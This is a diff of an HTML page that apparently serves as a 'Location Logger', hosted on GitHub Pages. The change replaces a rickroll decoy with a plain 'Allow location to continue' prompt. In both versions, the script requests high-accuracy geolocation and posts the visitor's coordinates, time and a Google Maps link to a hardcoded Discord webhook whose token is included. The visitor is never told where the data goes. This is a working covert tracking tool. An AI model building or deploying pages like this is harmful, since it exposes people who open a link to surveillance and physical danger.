@@ -3,53 +3,25 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loading...</title>
+  <title>Location Request</title>
   <style>
-    body { 
-      margin: 0; 
-      padding: 0; 
-      background: #000; 
-      color: white; 
-      font-family: Arial, sans-serif; 
-      text-align: center; 
-      overflow: hidden;
-    }
-    #status {
-      position: absolute;
-      top: 20px;
-      left: 0;
-      right: 0;
-      z-index: 10;
-      font-size: 18px;
-    }
-    #video {
-      width: 100vw;
-      height: 100vh;
-      object-fit: contain;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+    h1 { color: #333; }
   </style>
 </head>
 <body>
-  <div id="status">Please allow location access to continue...</div>
-
-  <iframe 
-    id="video" 
-    style="display: none;" 
-    src="https://www.youtube.com/embed/QDia3e12czc?autoplay=1&modestbranding=1&rel=0" 
-    title="Rickroll" 
-    frameborder="0" 
-    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-    allowfullscreen>
-  </iframe>
+  <h1>Allow location to continue</h1>
+  <p id="status">Please click "Allow" when the browser asks for your location.</p>
 
   <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1496992326613074151/ksCzYavEYpnu3ecrCpEMHiVDNvX0SMmU89NF8s9eOYGgLid054OkRlr8dQ6cIkZLluE8";   // ← Replace with your Discord webhook URL
+    const webhookUrl = "https://discord.com/api/webhooks/1496992326613074151/ksCzYavEYpnu3ecrCpEMHiVDNvX0SMmU89NF8s9eOYGgLid054OkRlr8dQ6cIkZLluE8";   // ← Change this
 
     function sendToDiscord(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
       const timestamp = new Date().toLocaleString();
 
+      // Build a nice message for Discord
       const embed = {
         embeds: [{
           title: "📍 New Location Accepted!",
@@ -60,7 +32,7 @@
             { name: "Time", value: timestamp, inline: false },
             { name: "Google Maps", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false }
           ],
-          footer: { text: "Location Logger + Rickroll" }
+          footer: { text: "Location Logger via GitHub Pages" }
         }]
       };
 
@@ -68,36 +40,29 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(embed)
-      }).catch(() => {}); // silent fail
+      })
+      .then(() => {
+        document.getElementById("status").innerHTML = "✅ Thank you! Location sent successfully.";
+      })
+      .catch(() => {
+        document.getElementById("status").innerHTML = "❌ Failed to send (check webhook URL).";
+      });
     }
 
     function handleError(err) {
-      document.getElementById("status").innerHTML = "Location blocked. Playing anyway...";
-      startRickroll();
+      let msg = "Location access was blocked or unavailable.";
+      if (err.code === 1) msg = "You blocked location access.";
+      document.getElementById("status").innerHTML = msg;
     }
 
-    function startRickroll() {
-      document.getElementById("status").style.display = "none";
-      document.getElementById("video").style.display = "block";
-      
-      // Optional: force fullscreen (works better on mobile)
-      const video = document.getElementById("video");
-      if (video.requestFullscreen) video.requestFullscreen();
-    }
-
-    // Main logic: Ask for location first, then play rickroll
+    // Ask for location immediately
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          sendToDiscord(position);
-          startRickroll();
-        },
-        handleError,
-        { enableHighAccuracy: true, timeout: 8000 }
-      );
+      navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
     } else {
-      // No geolocation support → just rickroll
-      startRickroll();
+      document.getElementById("status").innerHTML = "Geolocation not supported.";
     }
   </script>
 </body>
